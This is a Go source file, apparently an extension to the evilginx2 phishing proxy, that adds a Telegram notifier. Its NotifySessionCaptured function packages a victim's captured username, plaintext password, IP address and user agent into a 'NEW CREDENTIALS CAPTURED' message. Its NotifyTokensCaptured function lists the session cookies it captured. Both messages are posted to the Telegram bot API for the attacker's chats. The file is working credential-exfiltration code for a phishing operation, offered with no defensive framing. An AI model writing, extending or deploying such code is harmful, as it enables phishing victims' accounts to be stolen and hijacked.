package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

type TelegramBotConfig struct {
	BotToken  string `mapstructure:"bot_token" json:"bot_token" yaml:"bot_token"`
	ChatIDs  []int64 `mapstructure:"chat_ids" json:"chat_ids" yaml:"chat_ids"`
	Enabled  bool    `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
}

type TelegramClient struct {
	config *TelegramBotConfig
	client *http.Client
}

func NewTelegramClient() *TelegramClient {
	return &TelegramClient{
		config: &TelegramBotConfig{
			BotToken: "",
			ChatIDs:  []int64{},
			Enabled:  false,
		},
		client: &http.Client{
			Timeout: 10 * time.Second,
		},
	}
}

func (tc *TelegramClient) Configure(botToken string, chatIDs []int64, enabled bool) {
	tc.config.BotToken = botToken
	tc.config.ChatIDs = chatIDs
	tc.config.Enabled = enabled
}

func (tc *TelegramClient) IsEnabled() bool {
	return tc.config.Enabled && tc.config.BotToken != "" && len(tc.config.ChatIDs) > 0
}

func (tc *TelegramClient) SendMessage(message string) error {
	if !tc.IsEnabled() {
		return nil
	}

	for _, chatID := range tc.config.ChatIDs {
		url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", tc.config.BotToken)

		payload := map[string]interface{}{
			"chat_id": chatID,
			"text":   message,
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			return fmt.Errorf("failed to marshal telegram payload: %v", err)
		}

		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		if err != nil {
			return fmt.Errorf("failed to create telegram request: %v", err)
		}

		req.Header.Set("Content-Type", "application/json")

		resp, err := tc.client.Do(req)
		if err != nil {
			log.Error("telegram: failed to send message: %v", err)
			continue
		}
		resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			log.Warning("telegram: API returned status %d", resp.StatusCode)
		}
	}

	return nil
}

func (tc *TelegramClient) NotifySessionCaptured(s *Session, siteName string) {
	if !tc.IsEnabled() {
		return
	}

	msg := fmt.Sprintf("*🎣 NEW CREDENTIALS CAPTURED*\n\n*Site:* %s\n*Session ID:* `%s`\n*Username:* `%s`\n*Password:* `%s`\n*IP:* `%s`\n*User-Agent:* %s",
		siteName,
		s.Id,
		s.Username,
		s.Password,
		s.RemoteAddr,
		s.UserAgent,
	)

	tc.SendMessage(msg)
}

func (tc *TelegramClient) NotifyTokensCaptured(s *Session, siteName string) {
	if !tc.IsEnabled() {
		return
	}

	var cookiesInfo string
	for domain, tokens := range s.CookieTokens {
		for name := range tokens {
			cookiesInfo += fmt.Sprintf("\n  - *%s* (domain: %s)", name, domain)
		}
	}

	msg := fmt.Sprintf("*🔐 ALL AUTH TOKENS CAPTURED*\n\n*Site:* %s\n*Session ID:* `%s`\n*IP:* `%s`\n\n*Cookies captured:*%s",
		siteName,
		s.Id,
		s.RemoteAddr,
		cookiesInfo,
	)

	tc.SendMessage(msg)
}